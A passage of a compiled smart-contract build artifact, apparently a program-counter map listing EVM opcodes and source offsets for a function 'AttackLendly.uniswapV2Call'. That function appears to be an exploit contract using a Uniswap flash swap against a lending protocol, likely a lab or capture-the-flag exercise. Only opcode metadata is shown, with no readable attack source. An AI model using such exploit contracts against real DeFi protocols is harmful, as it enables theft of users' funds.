      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "1115": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1117": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1118": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "RETURNDATACOPY",
      "path": "3"
    },
    "1119": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "1120": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1122": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "REVERT",
      "path": "3"
    },
    "1123": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1124": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "POP",
      "path": "3"
    },
    "1125": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "POP",
      "path": "3"
    },
    "1126": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "POP",
      "path": "3"
    },
    "1127": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "POP",
      "path": "3"
    },
    "1128": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1130": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1131": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "1132": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "1134": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "NOT",
      "path": "3"
    },
    "1135": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "1137": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "DUP3",
      "path": "3"
    },
    "1138": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "ADD",
      "path": "3"
    },
    "1139": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "AND",
      "path": "3"
    },
    "1140": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "DUP3",
      "path": "3"
    },
    "1141": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "ADD",
      "path": "3"
    },
    "1142": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1143": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1145": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "1146": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "POP",
      "path": "3"
    },
    "1147": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1148": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "ADD",
      "path": "3"
    },
    "1149": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1150": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x487"
    },
    "1153": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "1154": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1155": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xE4F"
    },
    "1158": {
      "fn": "AttackLendly.uniswapV2Call",
      "jump": "i",
      "offset": [
        2933,
        2970
      ],
      "op": "JUMP",
      "path": "3"
    },
    "1159": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2933,
        2970
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1160": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1162": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1163": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1165": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1167": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1169": {
      "op": "SHL"
    },
    "1170": {
      "op": "SUB"
    },
    "1171": {
      "op": "NOT"
    },
    "1172": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0xE0"
    },
    "1174": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "DUP6",
      "path": "3"
    },
    "1175": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1176": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "SHL",
      "path": "3"
    },
    "1177": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "AND",
      "path": "3"
    },
    "1178": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1179": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "1180": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1182": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1184": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1186": {
      "op": "SHL"
    },
    "1187": {
      "op": "SUB"
    },
    "1188": {
      "op": "SWAP1"
    },
    "1189": {
      "op": "SWAP3"
    },
    "1190": {
      "op": "AND"
    },
    "1191": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "1193": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "DUP4",
      "path": "3"
    },
    "1194": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "ADD",
      "path": "3"
    },
    "1195": {
      "op": "MSTORE"
    },
    "1196": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1198": {
      "op": "DUP3"
    },
    "1199": {
      "op": "ADD"
    },
    "1200": {
      "op": "MSTORE"
    },
    "1201": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "1203": {
      "op": "ADD"
    },
    "1204": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1206": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1208": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1209": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1210": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "DUP4",
      "path": "3"
    },
    "1211": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "SUB",
      "path": "3"
    },
    "1212": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1213": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1215": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "DUP8",
      "path": "3"
    },
    "1216": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1217": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "EXTCODESIZE",
      "path": "3"
    },
    "1218": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "1219": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1220": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "1221": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x4CD"
    },
    "1224": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "1225": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1227": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1228": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "REVERT",
      "path": "3"
    },
    "1229": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1230": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "POP",
      "path": "3"
    },
    "1231": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "GAS",
      "path": "3"
    },
    "1232": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "CALL",
      "path": "3"
    },
    "1233": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "1234": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1235": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "1236": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x4E1"
    },
    "1239": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "1240": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "1241": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1243": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1244": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "RETURNDATACOPY",
      "path": "3"
    },
    "1245": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "1246": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1248": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "REVERT",
      "path": "3"
    },
    "1249": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1250": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "POP",
      "path": "3"
    },
    "1251": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "POP",
      "path": "3"
    },
    "1252": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "POP",
      "path": "3"
    },
    "1253": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        2898,
        2971
      ],
      "op": "POP",
      "path": "3"
    },
    "1254": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3013,
        3039
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1256": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3057,
        3061
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x3E8"
    },
    "1259": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3042,
        3048
      ],
      "op": "DUP6",
      "path": "3"
    },
    "1260": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3051,
        3054
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x3E7"
    },
    "1263": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3042,
        3054
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x4F8"
    },
    "1266": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3042,
        3054
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "1267": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3042,
        3054
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1268": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3042,
        3054
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xDDE"
    },
    "1271": {
      "fn": "AttackLendly.uniswapV2Call",
      "jump": "i",
      "offset": [
        3042,
        3054
      ],
      "op": "JUMP",
      "path": "3"
    },
    "1272": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3042,
        3054
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1273": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3042,
        3061
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x502"
    },
    "1276": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3042,
        3061
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "1277": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3042,
        3061
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1278": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3042,
        3061
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xE0B"
    },
    "1281": {
      "fn": "AttackLendly.uniswapV2Call",
      "jump": "i",
      "offset": [
        3042,
        3061
      ],
      "op": "JUMP",
      "path": "3"
    },
    "1282": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3042,
        3061
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1283": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3013,
        3061
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1284": {
      "op": "POP"
    },
    "1285": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3146,
        3177
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1287": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3204,
        3208
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x3E8"
    },
    "1290": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3180,
        3201
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x514"
    },
    "1293": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3180,
        3197
      ],
      "op": "DUP5",
      "path": "3"
    },
    "1294": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3200,
        3201
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "1296": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3180,
        3201
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xDDE"
    },
    "1299": {
      "fn": "AttackLendly.uniswapV2Call",
      "jump": "i",
      "offset": [
        3180,
        3201
      ],
      "op": "JUMP",
      "path": "3"
    },
    "1300": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3180,
        3201
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1301": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3180,
        3208
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x51E"
    },
    "1304": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3180,
        3208
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "1305": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3180,
        3208
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1306": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3180,
        3208
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xE0B"
    },
    "1309": {
      "fn": "AttackLendly.uniswapV2Call",
      "jump": "i",
      "offset": [
        3180,
        3208
      ],
      "op": "JUMP",
      "path": "3"
    },
    "1310": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3180,
        3208
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1311": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "PUSH1",
      "path": "3",
      "statement": 11,
      "value": "0x40"
    },
    "1313": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1314": {
      "op": "PUSH4",
      "value": "0xA9059CBB"
    },
    "1319": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1321": {
      "op": "SHL"
    },
    "1322": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1323": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "1324": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1326": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1328": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1330": {
      "op": "SHL"
    },
    "1331": {
      "op": "SUB"
    },
    "1332": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3242,
        3246
      ],
      "op": "PUSH32",
      "path": "3",
      "value": "0x0"
    },
    "1365": {
      "op": "DUP2"
    },
    "1366": {
      "op": "AND"
    },
    "1367": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "1369": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "DUP4",
      "path": "3"
    },
    "1370": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "ADD",
      "path": "3"
    },
    "1371": {
      "op": "MSTORE"
    },
    "1372": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1374": {
      "op": "DUP3"
    },
    "1375": {
      "op": "ADD"
    },
    "1376": {
      "op": "DUP6"
    },
    "1377": {
      "op": "SWAP1"
    },
    "1378": {
      "op": "MSTORE"
    },
    "1379": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3146,
        3208
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "1380": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3146,
        3208
      ],
      "op": "SWAP3",
      "path": "3"
    },
    "1381": {
      "op": "POP"
    },
    "1382": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3233
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1383": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3233
      ],
      "op": "DUP9",
      "path": "3"
    },
    "1384": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3233
      ],
      "op": "AND",
      "path": "3"
    },
    "1385": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3233
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1386": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3233
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0xA9059CBB"
    },
    "1391": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3233
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1392": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "1394": {
      "op": "ADD"
    },
    "1395": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x20"
    },
    "1397": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1399": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1400": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1401": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "DUP4",
      "path": "3"
    },
    "1402": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "SUB",
      "path": "3"
    },
    "1403": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1404": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1406": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "DUP8",
      "path": "3"
    },
    "1407": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "GAS",
      "path": "3"
    },
    "1408": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "CALL",
      "path": "3"
    },
    "1409": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "1410": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1411": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "1412": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x591"
    },
    "1415": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "1416": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "1417": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1419": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1420": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "RETURNDATACOPY",
      "path": "3"
    },
    "1421": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "1422": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1424": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "REVERT",
      "path": "3"
    },
    "1425": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1426": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "POP",
      "path": "3"
    },
    "1427": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "POP",
      "path": "3"
    },
    "1428": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "POP",
      "path": "3"
    },
    "1429": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "POP",
      "path": "3"
    },
    "1430": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1432": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1433": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "1434": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "1436": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "NOT",
      "path": "3"
    },
    "1437": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "1439": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "DUP3",
      "path": "3"
    },
    "1440": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "ADD",
      "path": "3"
    },
    "1441": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "AND",
      "path": "3"
    },
    "1442": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "DUP3",
      "path": "3"
    },
    "1443": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "ADD",
      "path": "3"
    },
    "1444": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1445": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1447": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "1448": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "POP",
      "path": "3"
    },
    "1449": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1450": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "ADD",
      "path": "3"
    },
    "1451": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1452": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x5B5"
    },
    "1455": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "1456": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1457": {
